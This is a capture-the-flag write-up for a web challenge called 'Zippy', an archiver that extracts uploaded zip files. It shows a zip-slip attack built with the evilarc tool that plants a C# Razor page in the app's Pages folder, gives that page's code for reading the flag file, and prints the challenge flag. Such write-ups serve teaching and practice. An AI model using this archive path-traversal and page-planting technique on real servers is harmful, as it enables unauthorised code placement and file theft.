### Challenge description

Need a quick solution for archiving your business files? Try Zippy today, the Zip Archiver built for the small to medium business!

NOTE: This challenge may take up to two minutes or so to completely start and load in your browser. Please wait.

### Solution

Looking at the webpage, we see we can browse the files, we can check the log and that we can upload a file. It's called zippy so we upload a zip and we see that it extracts it. We find a article that mentions this vuln. and we go to town.

For creating a malicious zip, we use [this script](https://github.com/ptoomey3/evilarc/blob/master/evilarc.py) that we found on github.

```shell
python2 evilarc.py Webshell.cshtml -p /app/Pages -o unix
```

We put the following code inside of it as we see that its dot net framework and... we get the flag when visiting the file on the server `/Flag` (thats what we named our file, `Flag.cshtml`).

```csharp
@page
@{
    ViewData["Title"] = "Flag Viewer";
    
    // Specify the path to your file
    string filePath = "/app/flag.txt";
    string flagContent = string.Empty;

    try
    {
        // Check if the file exists
        if (System.IO.File.Exists(filePath))
        {
            // Read all text from the file
            flagContent = System.IO.File.ReadAllText(filePath);
        }
        else
        {
            flagContent = "Flag file not found.";
        }
    }
    catch (Exception ex)
    {
        flagContent = $"Error reading flag file: {ex.Message}";
    }
}

<h1>Flag Viewer</h1>
<h2>Contents of flag.txt:</h2>
<pre>@flagContent</pre>
```
flag{a074eb7973c4c718790baefc096654dd}